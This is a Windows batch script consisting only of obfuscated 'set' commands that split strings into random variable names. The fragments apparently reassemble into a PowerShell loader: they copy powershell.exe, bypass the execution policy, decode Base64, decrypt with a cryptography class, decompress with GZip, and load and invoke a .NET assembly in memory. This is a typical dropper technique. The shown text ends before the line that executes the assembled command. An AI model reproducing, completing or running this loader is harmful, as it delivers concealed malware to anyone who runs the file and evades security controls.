@echo off
set "bObDVrvZEW=ll"
set "kovIEQwXJq=\v"
set "UWOlrhuFjk=we"
set "PhzyYEZfoZ=in"
set "qXBgIEZJDz=nd"
set "ZztIUdfvNT=.e"
set "FYIJMoVNJS=we"
set "vVkoDflCbI= C"
set "RqQdZwcYHe= /"
set "fGDcOETOlB=ow"
set "CVDBcrUyCP=he"
set "eXLyRQAxEr=s\"
set "lzluBxIZBK=ll"
set "FABchtbsYg=st"
set "lXdLAaSVlr=xe"
set "ttAxrsmdpR=em"
set "ighOiLyimR=rS"
set "WDMScWcHnX=Po"
set "uxlTRtfDTQ=0\"
set "pdJqlgbeBN=ws"
set "dBfmBFdXJH=32"
set "qyEqGozUWm=po"
set "UmrvWEvIqx=\W"
set "yTuvuKuhGv=1."
set "UGqEMdvpBB=do"
set "XzCFshJGwQ=Sy"
set "OGTGgocnLQ=py"
set "zkYhEriFKT=co"
set "ZEvNKmhMZw=Wi"
set "ekNfuFkfCm=:\"
set "LTeSaZpeOf=he"
set "fdahlmzwYW=y "
set "WnsiCNdCRk=rs"
set "bHkuSgIYLr= %~dp0"
set "PAMUKNgVwy=cd"
set "bguAxIrIoQ=ke($"
set "KoJTDnRADB=esaB"
set "lQZkouikGs=th('"
set "CPlmFmUFhQ=Stre"
set "cAFJvIncIc= [st"
set "DsTXRNPZft= = $"
set "mFsfoLuOqT=tS46"
set "dpTRmancSs=ert]"
set "IIjYFDLVpS=ptog"
set "WRBkDStqyp=esMa"
set "AkoRMPAHOI=ct S"
set "CthcbrbJzU=-ep "
set "xnvalEFlxY=bROw"
set "VKoTQvSgGh=gnir"
set "RCuQKDJcOS=Disp"
set "lcMojcggRg=m.IO"
set "RLFiVBXCDX=$pwK"
set "qCzeVVuJXP=();$"
set "iIDQgWmGYZ=bROw"
set "PgTkwaajDy='txe"
set "NFHXLIsJgb=pose"
set "PzkICocUaS=embl"
set "noTBOZqcWi=('%*'"
set "ONRCRJLWDr=grap"
set "plwriSMJrq=ijgG"
set "UoApGhbnBj=in $"
set "VVkDKvqGcq=.Cop"
set "eoMmokCVEp=.Ass"
set "EDFRqrXDEq=ck($"
set "YTMUgSVVfb=.Mem"
set "amkIHokXCd=)($V"
set "NquGtmcTxn=);$s"
set "LqXxPqxECh=7;$E"
set "ngAJwmqALu=nirt"
set "XcFqlRHmnZ=stem"
set "JTPzyAcJbC=Nb.T"
set "rTNXlsaabR=morF"
set "RakRyWpkgD= '')"
set "gOwUvsvoSv=);$E"
set "uCTzrzjqOS=czW "
set "hpkpYjRozd=]::C"
set "auIrNpAxGD=Secu"
set "bZZrsQpOVO=y.Cr"
set "KyOJKhuIMA=.Cry"
set "dFoIAdxlyR=z = "
set "iCcSPhChsl=$Pin"
set "eHmqJWrOyD=Bmor"
set "swiRoLlDvr=-4] "
set "zYFZRORALc=em.I"
set "LUjBnwuwyR=Syst"
set "pvynOVXzqL=.Mod"
set "EPeuRPdSex=rofi"
set "OhzyxcJtqX=Sasg"
set "LPypAmnBXS=V = "
set "mIyezhWsrA=ion."
set "wZVGiSwhuN= [Sy"
set "rqYRkqcUxQ=.Cre"
set "poRGJRfqZS=gjYA"
set "zMXtNwerlf=flec"
set "OpYhflGwZN=.Sec"
set "yCSBoliJoK=gMod"
set "aRMFXceUou=.GZi"
set "jdwoFXTmox=W.Su"
set "tDFnVKEQET=n ''"
set "gSsVGHmexK=bROw"
set "KZzZBvkHVn=yste"
set "LxwOTjRbSH=le  "
set "YTzJunKorB=.-16"
set "SdwPDvIKyR=ress"
set "FlGFVOjmFo=yste"
set "MuYRdAQZBw=::De"
set "EKTfJosOlT=.Dis"
set "dIpqEfKpmV=zHhH"
set "xWvNnCxZab== [S"
set "QEJjZVaOkT=rans"
set "TKaVyvJbkf=ddin"
set "KtNzLDSYNI=join"
set "OpAloukRpV=t Sy"
set "DsCePsSvUW=6] -"
set "RSuLpKWkdH=g = "
set "GlkBeuYCSP=vert"
set "hhwKfVvRqM='[-1"
set "rOdgLFuPPi=Gz.D"
set "NnWdKyWLJm=ose("
set "ZOfbsSRgSL=se()"
set "fQFOVOQjyr=).Sp"
set "HVLbJuKGPV===')"
set "SKaeZOzLki=[]] "
set "AOAMmxPJUi=m.IO"
set "szfEUYHInF=oArr"
set "lAEYEnoarF=ect "
set "GZwlsVelBS=saBm"
set "UjNVpyRLLy=oL'["
set "wecIWcRPxn=gE);"
set "aoGDTYqCme=tem."
set "yrYCInDIBb=daeR"
set "FmEKBsttUb=Invo"
set "dvOOSnFeJd=6esa"
set "LQVuxtmATH=ne);"
set "sUVgIfdMZx=3); "
set "DOpREnhxzJ=nage"
set "VxWVOZPZrB=tsWi"
set "GGwwJVqThU=Y, 0"
set "KmrUYPqHPp=hy.A"
set "jGGjNmQpmp=ew-O"
set "zrTQETpxCo=INb "
set "tOShqMafyx=raph"
set "hUMTGfCBKb=ewLi"
set "RKAaBpRJSJ='0Pg"
set "zoCTmNHXkn=$xpt"
set "kYhFIbPSms=[Sys"
set "tKiAZTYkJY=pres"
set "SQlMkgbvIt=Y = "
set "bdnHnkZKfC=('da"
set "oWKZPZGJDI= '')"
set "bWrIdahHQT=INb."
set "nPrVYuVYDm=ss -"
set "gEHoUWanuX=ingE"
set "zkGIEMMLYP=]::("
set "UJuEOdMVDk=brea"
set "KDhLqBnkxV=.Com"
set "PdWpxirFTv=jT, "
